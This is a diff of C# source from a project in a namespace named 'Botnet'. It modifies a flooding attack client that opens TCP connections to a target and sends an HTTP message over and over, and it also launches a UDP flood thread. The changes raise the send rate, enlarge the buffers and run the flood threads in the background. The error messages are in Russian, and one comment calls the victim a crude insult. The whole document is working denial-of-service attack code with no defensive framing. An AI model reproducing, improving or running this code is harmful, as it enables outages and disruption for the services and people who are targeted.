@@ -23,65 +23,69 @@ namespace Botnet
         private void InitClient(ref TcpClient client, NetworkInterface Adapter)
         {
             Client = new TcpClient(new IPEndPoint(NetworkInstruments.getAdapterIPAddress(Adapter), 0));
-            Client.ReceiveBufferSize = 1514;
-            Client.ReceiveTimeout = 3000;
+            Client.ReceiveBufferSize = 10000;
+            Client.SendBufferSize = 10000;
+            //Client.ReceiveTimeout = 500;
         }
         private void processHttpFlood(Object Params)
         {
             AttackParams _params = Params as AttackParams;
-            byte[] buff = new byte[1514];
-            byte[] msg = System.Text.ASCIIEncoding.ASCII.GetBytes(_params.HttpMsg);
-            try
+            if (_params.HttpFloodEnabled)
             {
-                while (Attacking)
+                byte[] buff = new byte[1514];
+                byte[] msg = System.Text.ASCIIEncoding.ASCII.GetBytes(_params.HttpMsg);
+                try
                 {
-                    InitClient(ref Client, Adapter);
-                    Client.SendBufferSize = msg.Length;
-                    Client.Connect(_params.Target);
-                    TryConnectAm = 0;
-                    NetworkStream TcpStream = Client.GetStream();
-                    try
+                    while (Attacking)
                     {
-                        while (Client.Connected && Attacking)
+                        InitClient(ref Client, Adapter);
+                        Client.SendBufferSize = msg.Length;
+                        Client.Connect(_params.Target);
+                        TryConnectAm = 0;
+                        NetworkStream TcpStream = Client.GetStream();
+                        try
                         {
-                            if (TcpStream.DataAvailable)
+                            while (Client.Connected && Attacking)
                             {
-                                TcpStream.Read(buff, 0, 1514);
+                                if (TcpStream.DataAvailable)
+                                {
+                                    TcpStream.Read(buff, 0, 1514);
+                                }
+                                if (TcpStream.CanWrite)
+                                {
+                                    TcpStream.Write(msg, 0, msg.Length);
+                                    httpCounter++;
+                                }
+                                Thread.Sleep(80);
                             }
-                            if (TcpStream.CanWrite)
-                            {
-                                TcpStream.Write(msg, 0, msg.Length);
-                                httpCounter++;
-                            }
-                            Thread.Sleep(100);
+                        }
+                        catch (System.IO.IOException)
+                        { }
+                    }
+                    Client.Close();
+                }
+                catch (SocketException err)
+                {
+                    if (err.ErrorCode == (int)SocketError.TimedOut) // 
+                    {
+                        Thread.Sleep(4000); // wait a bit, let the bitch have some rest
+                        if (TryConnectAm == 4)
+                        {
+                            Attacking = false;
+                            ErrorHandler(1, "Невозможно подключиться к цели");
+                        }
+                        else
+                        {
+                            TryConnectAm += 1;
+                            processHttpFlood(Params);
                         }
                     }
-                    catch (System.IO.IOException)
-                    { }
-                }
-                Client.Close();
-            }
-            catch (SocketException err)
-            {
-                if (err.ErrorCode == (int)SocketError.TimedOut) // 
-                {
-                    Thread.Sleep(4000); // wait a bit, let the bitch have some rest
-                    if (TryConnectAm == 4)
+                    if (err.ErrorCode == (int)SocketError.AddressNotAvailable)
                     {
                         Attacking = false;
-                        ErrorHandler(1, "Невозможно подключиться к цели");
+                        ErrorHandler(0, "Указанный адрес недопустим");
                     }
-                    else
-                    {
-                        TryConnectAm += 1;
-                        processHttpFlood(Params);
-                    }
-                }
-                if (err.ErrorCode == (int)SocketError.AddressNotAvailable)
-                {
-                    Attacking = false;
-                    ErrorHandler(0, "Указанный адрес недопустим");
-                }
+                } 
             }
 
         }
@@ -165,8 +169,9 @@ namespace Botnet
             {
                 HttpGenerator = new Thread(new ParameterizedThreadStart(processHttpFlood));
             }
-            if (HttpGenerator.ThreadState == ThreadState.Unstarted) //do we need it?
+            if (HttpGenerator.ThreadState == ThreadState.Unstarted)
             {
+                HttpGenerator.IsBackground = true;
                 HttpGenerator.Start(Params);
             }
             if (UdpGenerator.ThreadState == ThreadState.Stopped)
@@ -175,6 +180,7 @@ namespace Botnet
             }
             if (UdpGenerator.ThreadState == ThreadState.Unstarted) //do we need it?
             {
+                UdpGenerator.IsBackground = true;
                 UdpGenerator.Start(Params);
             }
         }
